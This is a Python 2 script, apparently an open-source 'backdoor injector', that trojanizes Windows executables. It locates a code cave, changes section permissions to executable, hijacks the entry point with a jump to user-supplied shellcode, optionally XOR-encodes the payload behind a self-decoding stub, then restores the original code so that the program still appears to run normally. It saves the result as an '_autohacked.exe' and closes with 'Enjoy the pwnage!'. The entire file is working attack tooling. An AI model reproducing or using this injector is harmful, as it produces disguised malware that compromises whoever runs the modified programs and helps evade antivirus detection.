#!/usr/bin/python
from capstone import *  # Disassembler
from pefile import *    # PE functions
from keystone import *  # Assembler
import argparse

CAVE_SIZE = 1000            # Required size of code cave
BASE_ADDRESS = "0x00400000" # Default base address
XOR_KEY = "0x0F"            # Default key for xor encoding

# Stack alignment commands
PUSHFD = bytearray("\x9c")
PUSHAD = bytearray("\x60")
POPAD = bytearray("\x61")
POPFD = bytearray("\x9d")


# ----------------------------------------------------------------------------
# --- Search through PE and return first code cave found with correct size
# ----------------------------------------------------------------------------
def search_for_code_caves(pe, size, base_address):
    code_cave = [] # Store code cave data for later

    # Loop through sections and search for code caves
    section_counter = 0
    for section in pe.sections:
        cave = ""
        counter = 0
        data = section.get_data()
        for byte in data:
            if byte == "\x00":
                cave += byte
            else:
                if len(cave) >= CAVE_SIZE:
                    code_cave.append(base_address + section.VirtualAddress + counter - len(cave))
                    print "Code cave found: "
                    print "\tSection: " + section.Name.decode('utf-8')
                    print "\tSection vAddress: " + hex(base_address + section.VirtualAddress)
                    code_cave.append(base_address + section.VirtualAddress)
                    print "\tPointer to Raw Data: " + hex(base_address + section.PointerToRawData)
                    code_cave.append(base_address + section.PointerToRawData)
                    print "\tStart Address: " + hex(base_address + section.VirtualAddress + counter - len(cave))
                    print "\tEnd Address: " + hex(base_address + section.VirtualAddress + counter)
                    print "\tCave Size: " + hex(len(cave))
                    print "\tOriginal Permissions: " + hex(section.Characteristics)
                    print "Changing section permissions to 0x80000020..."
                    print ""
                    pe.sections[section_counter].Characteristics = 0x80000020
                    return code_cave   # We found one so let's quit here
                    break
                cave = ""
            counter = counter + 1
        section_counter += 1

# -----------------------------------------------------
# --- Return section object for entry point's section
# -----------------------------------------------------
def find_entry_point_section(pe, entry_point):
    # to save section with entry point
    ep_section = ""
    ep_section_counter = 0
    # Loop through section headers and print
    for section in pe.sections:
        if (entry_point >= section.VirtualAddress) and (entry_point <= (section.VirtualAddress + section.Misc_VirtualSize)):
            # Print section info
            print "Entry point is in the following section:"
            print(section.Name.decode('utf-8'))
            print("\tVirtual Address: " + hex(section.VirtualAddress))
            print("\tPointer to Raw Data: " + hex(section.PointerToRawData))
            print("\tVirtual Size: " + hex(section.Misc_VirtualSize))
            print("\tRaw Size: " + hex(section.SizeOfRawData))
            print("\tOriginal Permissions: " + hex(section.Characteristics))
            print "Changing section permissions to 0x80000020..."
            print ""
            pe.sections[ep_section_counter].Characteristics = 0x80000020
            return section
            break
        ep_section_counter += 1

# ------------------------------------------------------------------
# --- Returns original instruction at original entry point address
# ------------------------------------------------------------------
# For the program's original entry point, we can just overwrite however many bytes we need
# because we know it will execute our JMP code before anything else.
def get_old_instructions_oep(ep_section, entry_point, base_address, jmp_code):
    # Load the first few instructions starting at the entry point
    # x86 instructions should not usually be longer than 15 bytes
    CODE = ep_section.get_data(start=entry_point, length=len(jmp_code))
    old_instruction = ""
    for byte in CODE:
        old_instruction += bytes(byte)

    return old_instruction

# -------------------------------------------------------------------------
# --- Returns original instruction at user-specified entry point address
# -------------------------------------------------------------------------
# If we inject JMP code somewhere in the middle of the EXE's code, we can't just overwrite
# data willy-nilly because the code after our JMP code might be needed at some point. We can only
# overwrite a single instruction. So the instruction must use enough bytes to fit the JMP code.
def get_old_instructions_uep(ep_section, entry_point, base_address, jmp_code):
    # Get the first few bytes from user-specified entry point.
    CODE = ep_section.get_data(start=entry_point, length=len(jmp_code) + 15)

    # Disassemble that section of code
    md = Cs(CS_ARCH_X86, CS_MODE_32)

    # Pull out just the first instruction
    counter = 0
    for instruction in md.disasm(CODE, base_address + entry_point):
        if counter == 0:
            i = instruction
        counter += 1


    old_instruction = bytearray()
    # Test to see if the specified instruction is at least as long as the JMP code
    if len(i.bytes) >= len(jmp_code):
        for byte in i.bytes:
            old_instruction.append(byte)
    else:
        print "ERROR: Specified entry point instruction is not long enough to fit JMP code!"
        print "QUITTING"
        exit()

    return old_instruction


# -----------------------------------------------
# --- Builds JMP code to JMP to the shellcode
# -----------------------------------------------
def build_jmp_code(code_caves, base_address, entry_point):
    jmp_offset = code_caves[0] - (base_address + entry_point)

    # Assemble jump code to get to our code cave
    # separate assembly instructions by ; or \n
    CODE = "JMP " + hex(jmp_offset)

    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)

    # Build string containing new byte codes
    jmp_instruction = b""
    for byte in encoding:
        jmp_instruction += bytes([byte])

    return jmp_instruction

# Assemble reset code
# - This is executed after our shell code. It overwrites the original entry point instructions with whatever was there before we messed with it.
# - Then we can JMP back to the original entry point again

def build_reset_code(old_instruction, base_address, entry_point):
    CODE = ""
    for byte in reversed(old_instruction):                          # Must reverse due to how the stack works
        CODE += "PUSH " + hex(byte) + ";"                           # PUSH original entry point's opcodes onto stack

    CODE += "MOV ECX, " + hex(len(old_instruction)) + ";"           # Setup loop counter (number of opcodes for original instructions)
    CODE += "MOV EDI, " + hex(base_address + entry_point) + ";"     # Put original entry point address into EDI

    CODE += "loopbegin:;"                                           # Beginning of loop
    CODE += "MOV ESI, ESP;"                                         # Put ESP address into ESI (Address of op codes)
    CODE += "MOVSB;"                                                # Copy byte from ESP address to original entry point
    CODE += "ADD ESP, 0x04;"
    CODE += "loop loopbegin;"

    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    reset_code = ""
    for byte in encoding:
        reset_code += bytes([byte])

    return reset_code

def build_shellcode_1(shellcode_file):
    # Build shellcode
    shellcode = bytearray(shellcode_file.read() + ("\x90" * 4))
    return shellcode

def build_stack_alignment(stack_align):
    # Assemble stack alignment code
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(stack_align)
    except KsError as e:
        print("ERROR: %s" %e)

    align_code = bytearray()
    for byte in encoding:
        align_code.append(byte)

    # By default leave 8 NOPs so we can manually test alignment code in a debugger if needed
    align_code += bytearray("\x90" * (8 - len(align_code)))

    return align_code

def build_shellcode_2(shellcode, entry_point, code_caves, base_address):

    shellcode2 = shellcode + POPAD + POPFD

    # calculate offset to JMP back to entry point after SHELLCODE
    current_location = code_caves[0] - base_address + len(shellcode2)
    CODE = "JMP " + hex(entry_point - current_location) + ";"
    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    jmp = ""
    for byte in encoding:
        jmp += bytes([byte])

    shellcode2 += jmp
    return shellcode2

# -------------------------------------------------
# --- Each byte will be xor'd with the same key
# -------------------------------------------------
def encode_xor(code_caves, base_address, shellcode):
    # calculate offset to JMP back to entry point after SHELLCODE
    # assume decoder instructions are 20 bytes long (and add 1 each for PUSHAD and PUSHFD)
    shellcode_start_address = code_caves[0] + 22
    shellcode_end_address = code_caves[0] + 21 + len(shellcode)

    # This ASM will decode xor'd bytes
    CODE =  "MOV EAX, " + hex(shellcode_start_address) + ";"    # Put address of shellcode into EAX
    CODE += "xorloop:"
    CODE += "XOR BYTE PTR DS:[EAX], " + XOR_KEY + ";"           # XOR this byte with 0x0F
    CODE += "INC EAX;"                                          # Increment the memory address of shellcode
    CODE += "CMP EAX, " + hex(shellcode_end_address) + ";"      # Compare current memory address to end of shellcode address
    CODE += "JLE xorloop;"                                      # JMP back to XOR instruction (loop)
    CODE += "NOP;NOP;NOP;NOP;"                                  # Couple of NOPS between the decoder and our shellcode

    # Assemble our decoder
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    decoder = bytearray()
    for byte in encoding:
        decoder.append(byte)

    # Loop through and xor our shellcode
    xord_shellcode = bytearray()
    for byte in shellcode:
        xord_shellcode.append(byte ^ int(XOR_KEY, 16))

    # Copy the decoder code and then the xor'd shellcode into a new shellcode bytearray
    new_shellcode = bytearray()
    for byte in decoder:
        new_shellcode.append(byte)
    for byte in xord_shellcode:
        new_shellcode.append(byte)

    new_shellcode = PUSHFD + PUSHAD + new_shellcode

    return new_shellcode

# ---------------------------------------------------------
# --- Each time we xor a byte, the xor key is incremented
# ---------------------------------------------------------
def encode_xor_rolling(code_caves, base_address, shellcode):
    # calculate offset to JMP back to entry point after SHELLCODE
    # assume decoder instructions are 22 bytes long (and add 1 each for PUSHAD and PUSHFD)
    shellcode_start_address = code_caves[0] + 24
    shellcode_end_address = code_caves[0] + 23 + len(shellcode)

    # This ASM will decode xor'd bytes
    CODE =  "MOV EAX, " + hex(shellcode_start_address) + ";"    # Put address of shellcode into EAX
    CODE += "MOV BL, " + XOR_KEY + ";"                          # BL will hold the rolling xor key
    CODE += "xorloop:"
    CODE += "XOR BYTE PTR DS:[EAX], BL;"                        # XOR this byte with BL key
    CODE += "INC EAX;"                                          # Increment the memory address of shellcode
    CODE += "INC EBX;"                                          # increment rolling key
    CODE += "CMP EAX, " + hex(shellcode_end_address) + ";"      # Compare current memory address to end of shellcode address
    CODE += "JLE xorloop;"                                      # JMP back to XOR instruction (loop)
    CODE += "NOP;NOP;NOP;NOP;"                                  # Couple of NOPS between the decoder and our shellcode

    # Assemble our decoder
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    decoder = bytearray()
    for byte in encoding:
        decoder.append(byte)

    # Loop through and xor our shellcode
    rolling_key = int(XOR_KEY, 16)
    xord_shellcode = bytearray()
    for byte in shellcode:
        xord_shellcode.append(byte ^ rolling_key)
        rolling_key += 1
        if rolling_key > 255:
            rolling_key = 0

    # Copy the decoder code and then the xor'd shellcode into a new shellcode bytearray
    new_shellcode = bytearray()
    for byte in decoder:
        new_shellcode.append(byte)
    for byte in xord_shellcode:
        new_shellcode.append(byte)

    new_shellcode = PUSHFD + PUSHAD + new_shellcode

    return new_shellcode


def write_new_pe(pe, new_filename, entry_point, ep_section, jmp_instruction, code_caves, shellcode, base_address):
    # Write new entry point instruction to exe
    pe.set_bytes_at_offset(entry_point - (ep_section.VirtualAddress - ep_section.PointerToRawData), jmp_instruction)
    # Write shellcode to exe
    pe.set_bytes_at_offset(code_caves[0] - base_address - (code_caves[1] - code_caves[2]), shellcode)
    pe.write(new_filename + "_autohacked.exe")


# ------------------------------------
# --- Main Loop
# ------------------------------------
def main():
    # Start by obtaining user arguments
    parser = argparse.ArgumentParser(description='Codecave injector\nBy: Rick Osgood')
    parser.add_argument("--pefile", required=True, help="Path to Windows executable PE file to inject.")
    parser.add_argument("--shellcode", required=True, help="Path to shellcode binary file, e.g. msfvenom -f raw")
    parser.add_argument("--base_address", required=False, default=BASE_ADDRESS, help="Base address of pe file when executed on target platform. (0x00400000)")
    parser.add_argument("--encoding", required=False, default="none", help="Encode your shellcode. (none, xor, xor_rolling) Default=none")
    parser.add_argument("--entry_point", required=False, default="none", help="Memory address where injector will hijack code execution. Default=Program entry point")
    parser.add_argument("--stack_align", required=False, default="NOP;NOP;NOP;NOP;NOP;NOP;NOP;NOP;", help="Optional ASM instructions (up to 8 bytes) to re-align stack before returning to program. (ADD ESP,0x204)")
    args = parser.parse_args()

    base_address = int(args.base_address, 16)

    print """######                                                      ###
#     #   ##    ####  #    # #####   ####   ####  #####      #  #    #      # ######  ####  #####  ####  #####
#     #  #  #  #    # #   #  #    # #    # #    # #    #     #  ##   #      # #      #    #   #   #    # #    #
######  #    # #      ####   #    # #    # #    # #    #     #  # #  #      # #####  #        #   #    # #    #
#     # ###### #      #  #   #    # #    # #    # #####      #  #  # #      # #      #        #   #    # #####
#     # #    # #    # #   #  #    # #    # #    # #   #      #  #   ## #    # #      #    #   #   #    # #   #
######  #    #  ####  #    # #####   ####   ####  #    #    ### #    #  ####  ######  ####    #    ####  #    #"""
    print "By: Rick Osgood"
    print ""

    # Load file as pe object
    print "Loading pe file..."
    pe = PE(args.pefile)

    print "Loading shellcode file..."
    # Load shellcode from file
    shellcode_file = open(args.shellcode)
    # And create first portion of shellcode
    shellcode = build_shellcode_1(shellcode_file)

    # Grab the exe's entry point virtual offset
    if args.entry_point == "none":
        print "Entry point not specified. Using program original entry point."
        entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    else:
        entry_point = int(args.entry_point, 16)
        entry_point = entry_point - base_address
    print "Using entry point: " + hex(entry_point + base_address)

    print "Locating entry point section...\n"
    ep_section = find_entry_point_section(pe, entry_point)

    # Need to know about how long our decoder shellcode is so we can make sure the code cave is big enough to fit it
    if args.encoding == "xor":
        decoder_length = 20
    elif args.encoding == "xor_rolling":
        decoder_length = 22
    else:
        decoder_length = 0

    print "Searching for a suitable code cave...\n"
    code_cave_size = len(shellcode) + 5 + decoder_length
    code_caves = search_for_code_caves(pe, code_cave_size, base_address)
    if not code_caves:
        print "ERROR: No code caves found!"
        exit()

    if args.encoding == "xor":
        print "Encoding shellcode with xor and adding decoder function..."
        shellcode = encode_xor(code_caves, base_address, shellcode)
    elif args.encoding == "xor_rolling":
        print "Encoding shellcode with xor_rolling and adding decoder function..."
        shellcode = encode_xor_rolling(code_caves, base_address, shellcode)
    else:
        shellcode = PUSHFD + PUSHAD + shellcode

    print "Locating offset from shellcode to entry point..."
    jmp_instruction = build_jmp_code(code_caves, base_address, entry_point)

    print "Saving original instructions at entry point..."
    # If the entry point is the program's original entry point, we can just overwrite the first X bytes with no worries
    if entry_point == pe.OPTIONAL_HEADER.AddressOfEntryPoint:
        old_instruction = get_old_instructions_oep(ep_section, entry_point, base_address, jmp_instruction)
    else:
        # If the entry point is in the middle of the code, we can only safely overwrite a single instruction.
        old_instruction = get_old_instructions_uep(ep_section, entry_point, base_address, jmp_instruction)

    print "Building code to reset entry point to normal..."
    reset_code = build_reset_code(old_instruction, base_address, entry_point)
    shellcode += reset_code

    if args.stack_align != ("NOP;" * 8):
        print "Adding stack re-alignment code..."
    stack_align = build_stack_alignment(args.stack_align)
    shellcode += stack_align

    print "Building final shellcode.."
    # Finish building shellcode
    shellcode = build_shellcode_2(shellcode, entry_point, code_caves, base_address)

    print "Saving new file..."
    # Create the new, modified exe file
    write_new_pe(pe, args.pefile, entry_point, ep_section, jmp_instruction, code_caves, shellcode, base_address)

    print ""
    print "All done! Enjoy the pwnage! >:D"

if __name__ == '__main__':
    main()
